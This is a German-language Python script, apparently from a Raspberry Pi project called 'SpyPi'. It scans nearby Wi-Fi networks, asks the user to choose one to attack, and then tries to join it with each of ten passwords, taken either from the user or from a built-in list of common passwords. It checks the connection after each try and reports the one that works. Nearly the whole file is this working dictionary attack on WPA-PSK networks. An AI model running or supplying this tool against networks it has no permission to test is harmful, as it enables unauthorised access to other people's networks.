# -*- encoding: utf-8 -*-
# Sarah M. 2017
import sys
import time
import subprocess
import os
import string
import random
from colors import farben

#Funktion um zu verhindern, dass Ausgabe auf neuer Zeile gedruckt wird

def jumpback():
    global foo
    sys.stdout.write("\033[F")
    sys.stdout.write("\033[K")
    
#Auswahl ESSID

def essidwahl(lessid, jumpback):
    u = subprocess.Popen(["sudo", "python3", "/home/pi/SpyPi/Code/scanner.py"],stdout = subprocess.PIPE, universal_newlines = True)
    out, err = u.communicate()
    out = out.split("\n")    
    for line in out:
        if  ("ESSID" in line) or ("PSK" in line):
            print(line)

    print(farben.IN + "Bitte geben Sie die ESSID des anzugreifenden Netzwerks ein..." + farben.END)
    print(farben.LD + "Geben Sie keine Informationen von den Spalten MAC, AUTH., PROT.ein!" + farben.END)
    ssid = input(farben.IN + "ESSID: "+ farben.END)
    ssid = ssid.strip()
    
    while True:
        for line in out:
            if   ("%s  " % ssid in line) and len(ssid)>0 and ("PSK" in line):
                os.system('reset')
                print (farben.IN + "Sie haben " + farben.AUF + ssid + farben.IN + " gewählt. Happy Hacking!" + farben.END)
                lessid.append(ssid)
                time.sleep(5)
                return
        jumpback()
        print (farben.AUF+ "Bitte wählen Sie eines der aufgelisteten Netzwerke!" + farben.END)
        time.sleep(2)
        jumpback()
        ssid = input(farben.IN + "ESSID: "  + farben.END)

def woerterliste(liste, standardliste, maxLengthliste, jumpback):      
    os.system('reset')
    print (farben.IN + "Möchten sie Ihre Passwortliste selbst erstellen?" + farben.END)
    entscheid = input(farben.IN + "J/N? : " + farben.END).lower()
    if  entscheid == "n":
        randomliste = random.sample(standardliste, 10)
        liste.extend(randomliste)
        return

    elif entscheid == "j":
        os.system('reset')
        print(farben.IN + "Bitte geben Sie 10 Passwörter ein, die Sie zum Angriff verwenden möchten!" + farben.END)
        while len(liste) < maxLengthliste:
            x = len(liste)
            item = input(farben.IN + "Passwort"+str(x+1)+": " + farben.END)
            item = item.replace(" ","")
            if  (len(item) < 8):
                print("Ihr Passwort ist zu kurz!")
            elif (item in liste):
                print ("Ihr Passwort ist bereits in der Liste!")
            else:
                liste.append(item)
                print ("Passwort wurde der Liste hinzugefügt.")
            time.sleep(2)
            jumpback()
            jumpback()
        print (farben.IN +"Ihre Passwörter sind: " + farben.AUF + str(liste) + farben.END)
        time.sleep(5)
        return
    else:
        woerterliste(liste, standardliste, maxLengthliste, jumpback)
    
# Neukonfiguration / Passwortwechsel

def passwortwechsel(essid, psk):
    cmd1 = ["sudo", "wpa_cli","-iwlan1", "add_network"]
    cmd2 = ["sudo", "wpa_cli","-iwlan1", "set_network", "0", "ssid", '\"%s\"' %essid]
    cmd3 = ["sudo", "wpa_cli","-iwlan1", "set_network", "0", "psk", '\"%s\"' %psk]
    cmd4 = ["sudo","wpa_cli","-iwlan1", "select_network", "0"]
    cmd5 = ["sudo","wpa_cli","-iwlan1", "enable_network", "0"]
    for a in cmd1,cmd2,cmd3,cmd4,cmd5:
        cmd = subprocess.Popen(a,stdout=subprocess.PIPE, universal_newlines=True)
        out, err = cmd.communicate()

def reset():
    cmd1 = ["wpa_cli","-iwlan1", "disable_network", "0"]
    cmd2 = ["wpa_cli","-iwlan1", "remove_network", "0"]
    cmd3 = ["wpa_cli","-iwlan1", "quit"]
    for x in cmd1,cmd2,cmd3:
        cmd = subprocess.Popen(x,stdout=subprocess.PIPE)
        out, err = cmd.communicate()


# Test ob Verbindung aufgebaut werden konnte

def verbindungscheck(essid,psk):
    print(farben.IN + "Der Angriff hat begonnen..." + farben.END)
    proc = subprocess.Popen(["iwconfig", "wlan1"],stdout=subprocess.PIPE, universal_newlines=True)
    out, err = proc.communicate()
    while True:
        for line in out.split("\n"):
            if 'ESSID:"%s"'% essid in line:
                print (farben.IN + "Die Verbindung wurde erfolgreich hergestellt, " + farben.AUF + psk + farben.IN + " ist das richtige Passwort!!" + farben.END)
                time.sleep(5)
                sys.exit()
        
        print(farben.IN + "Schade, " + farben.AUF + psk + farben.IN + " ist leider nicht das richtige Passwort." + farben.END)
        return


# Reset aller Konfigurationen

def resetall():
    cmd1 = ["wpa_cli","-iwlan1", "disable_network", "all"]
    cmd2 = ["wpa_cli","-iwlan1", "remove_network", "all"]
    cmd3 = ["wpa_cli","-iwlan1", "quit"]
    for y in cmd1,cmd2,cmd3:
        cmd = subprocess.Popen(y,stdout=subprocess.PIPE)
        out, err = cmd.communicate()

# Neustart networking

def killall():
    cmd1 = ["sudo", "killall", "-HUP", "wpa_supplicant"]
    cmd2 = ["sudo", "systemctl", "daemon-reload"]
    cmd3 = ["sudo", "service", "networking", "restart"]
    cmd4 = ["sudo", "wpa_action", "wlan1", "reload"]
    cmd5 = ["sudo", "ifdown", "wlan1"]
    cmd6 = ["sudo", "ifup", "wlan1"]
    for p in cmd1,cmd2,cmd3,cmd4,cmd5,cmd6:
        DEVNULL = open(os.devnull, 'w')
        killall = subprocess.Popen(["sudo", "killall", "-HUP", "wpa_supplicant"],stdout=subprocess.PIPE, stderr=DEVNULL, universal_newlines=True)
        out, err = killall.communicate()

# Alle Einstellungen zurücksetzten und networking Neustart

def wipe():
    resetall()
    killall()

#Standardpasswortliste

standardliste = ['12345678', 'hallo123', 'mudeqobixusa', 'passwort', \
                'mudeqobixusa', '3rjs1la7qe', '66666666',\
                '123456789', 'starwars', 'princess','passwort1', \
                'judihui', '11111111', 'superman', '123123123', 'schalke04', \
                'baseball', 'football', '696969', 'trustno1', 'keahnig',
                'wlanpasswort', 'qwertzui', 'asdfghjk', 'yxcvbnmq', 'jennifer', \
                'iloveyou', '987654321', '87654321', 'poiuztre', 'lkjhgfds', \
                'poiuztrewq', '1234567890', '0987654321', '09876543', 'passw0rd', \
                'passw0rt', 'hall0123', 'delphin123']

def main():
    liste = []
    lessid = []
    maxLengthliste = 10
    essidwahl(lessid, jumpback)
    woerterliste(liste, standardliste, maxLengthliste, jumpback)
    wipe()
    for b in range(int(maxLengthliste)):
        essid ='%s' % lessid[0]
        psk = '%s' % liste[b]
        passwortwechsel(essid, psk)
        os.system('reset')
        verbindungscheck(essid,psk)
        reset()
        killall()
    os.system('reset')
    print(farben.IN + "Der Angriff wurde beendet..." + farben.END)
    print (farben.IN + "Leider hat keines der Passwörter gepasst!" + farben.END)
    time.sleep(5)
        
main()
